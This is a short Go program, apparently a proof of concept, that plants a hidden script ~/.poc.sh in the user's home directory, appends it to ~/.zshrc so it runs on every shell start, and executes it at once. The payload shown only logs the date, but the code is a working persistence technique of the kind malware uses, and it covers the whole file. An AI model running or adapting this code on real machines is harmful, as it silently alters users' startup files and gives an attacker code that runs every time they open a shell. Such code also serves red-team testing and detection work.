package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	// Define the home directory and file paths
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error getting home directory:", err)
		return
	}

	scriptPath := filepath.Join(homeDir, ".poc.sh")
	startupFilePath := filepath.Join(homeDir, ".zshrc")

	// Create the shell script content
	scriptContent := `#!/bin/zsh
echo "$(date)" >> ~/poc.txt
`

	// Create or overwrite the .poc.sh script
	err = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	if err != nil {
		fmt.Println("Error writing .poc.sh script:", err)
		return
	}

	// Append the script execution command to .zshrc
	f, err := os.OpenFile(startupFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening .zshrc file:", err)
		return
	}
	defer f.Close()

	_, err = f.WriteString(fmt.Sprintf("\n%s\n", scriptPath))
	if err != nil {
		fmt.Println("Error writing to .zshrc file:", err)
		return
	}

	// Execute the .poc.sh script immediately
	cmd := exec.Command("/bin/zsh", scriptPath)
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error executing .poc.sh script:", err)
		return
	}

	fmt.Println(".poc.sh script created and added to .zshrc. Script executed.")
}
